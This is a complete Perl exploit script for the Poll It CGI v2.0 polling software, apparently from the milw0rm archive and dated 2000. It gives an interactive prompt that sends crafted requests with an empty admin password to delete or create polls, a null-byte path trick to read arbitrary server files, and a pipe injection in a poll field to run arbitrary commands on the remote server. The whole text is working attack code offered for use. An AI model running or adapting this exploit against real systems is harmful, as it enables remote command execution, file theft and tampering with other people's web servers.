#!/usr/bin/perl

######################################
#                                    #
#                                    #
#      Poll It CGI v2.0 exploit      #
#       keelis/havoc korp 2000       #
#                                    #
#    shouts to modjo, p, zen, kd,    #
#     ab, all the script kiddies.    #
#                                    #
#                                    #
#     keelis(at)hushmail(dot)com     #
#                                    #
#                                    #
######################################

use Socket;

($host, $cgi_loc) = @ARGV[0,1];

$ip=inet_aton($host);

print("\n\t+---   Poll It CGI v2.0 exploit  ---+");
print("\n\t+---    keelis/havoc korp 2000   ---+\n\n\n");

usage() if (!defined($host) || !defined($cgi_loc));

while(true)
{
	print "[poll\@$host] ";

	$stdin = \*STDIN;
	$cmdin = <$stdin>;

	chomp($cmdin);
	($cmd, $param) = split(/ /, $cmdin, 2);
	
	if ($cmd eq "d")
	{
		$request = "?load=admin&admin_password=&action=delete_poll";
		$success_msg = "current poll has been deleted\n\n";
		make_request();
	}

	if ($cmd eq "e")
	{
		$request = "?load=admin&admin_password=&action=expire_poll";
		$success_msg = "current poll has been expired\n\n";
		make_request();
	}

	if ($cmd eq "c")
	{
		if (!defined($param))
		{
			print "you need to specify a voting topic for the new poll\n\n";
			next;
		}

		$request = "?load=admin&admin_password=&action=create_new&new_pollaction=1&show_after=1&new_title=$param";
		$success_msg = "created new poll with voting topic: \"$param\"\n\n";
		make_request();
	}

	if ($cmd eq "a")
	{
		if (!defined($param))
		{
			print "you need to specify the text for the new voting option\n\n";
			next;
		}

		$request = "?load=admin&admin_password=&action=add_option&add_option=$param";
		$success_msg = "voting option added to current poll: \"$param\"\n\n";
		make_request();
	}

	if ($cmd eq "g")
	{
		if (!defined($param))
		{
			print "you need to specify the command to be run\n\n";
			next;
		}

		$request = "?load=admin&admin_password=&action=add_option&add_option=none&poll_options=$param%7C";
		$success_msg = "command has been run on remote server: \"$param\"\n\n";
		make_request();
	}

	if ($cmd eq "r")
	{
		if (!defined($param))
		{
			print "you need to specify the file to be read\n\n";
			next;
		}

		$request = "?load=admin&data_dir=$param%00";
		$success_msg = "contents of \"$param\" follow:\n\n";
		make_request();
	}

	if ($cmd eq "?" || $cmd eq "h" || $cmd eq "help")
	{
		print "\n? \t\tshow this help screen\n";
		print "d \t\tdelete current poll\n";
		print "e \t\texpire current poll\n";
		print "c <param>\tcreate new poll using <param> as topic\n";
		print "a <param>\tadd <param> to voting options\n";
		print "r <param>\tread the file <param> in remote server\n";
		print "g <param>\trun <param> in the remote server\n";
		print "x \t\texit pollex.pl shell\n\n";
		next;
	}

	if ($cmd eq "x")
	{
		print "\n";
		last;
	}

	print "command not found. use \"?\" for help screen.\n\n";
}

sub make_request {
	$request=~s/ /+/g;
	$request=~s/\\/%5C/g;
	$request=~s/\//%2F/g;

	my @req=sendraw("GET $cgi_loc$request HTTP/1.1\r\nHost: $host\r\n\r\n");
	$reqanswer=join('', @req);

	($httpv, $httpcode) = split(/ /, $reqanswer);
	$httpcode = substr($httpcode, 0, 3);

	if ($httpcode eq "200") {
		print $success_msg if ($cmd ne "r");
	} else {
		if ($httpcode ne "404")
		{
			print "httpd returned an error code:\n\n";
			print $reqanswer,"\n";
		} else {
			die "unexpected httpd error code 404. aborting...\n\n"
		}
	}


	if ($cmd eq "r")
	{	$reqanswer=substr($reqanswer, index($reqanswer, "\r\n\r\n")+4);

		if (substr($reqanswer, 6, 15) eq "Template : File")
		{
			print "file \"$param\" not found or non-readable from cgi\n\n";
		} else {
			print $success_msg;
			print $reqanswer,"\n";
		}
	}

	next;
}

sub usage {
	print "Usage:  pollex.pl <host> <cgi_loc>\n\n";
	print "\thost   :\thost/ip where CGI resides\n";
	print "\tcgi_loc:\tpath to the CGI (non-SSI version needed)\n\n";
	exit(0);
}

sub sendraw {
        my ($pstr)=@_;

        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("socket problems... aborting.\n");

        if(connect(S,pack "SnA4x8",2,80,$ip)){
                select(S);
                $|=1;
                print $pstr;
                my @in=<S>; 
                select(STDOUT);
	        close(S); 
                return @in;
        } else {
		die("can\'t connect... aborting.\n");
	}
}

# milw0rm.com [2000-11-15]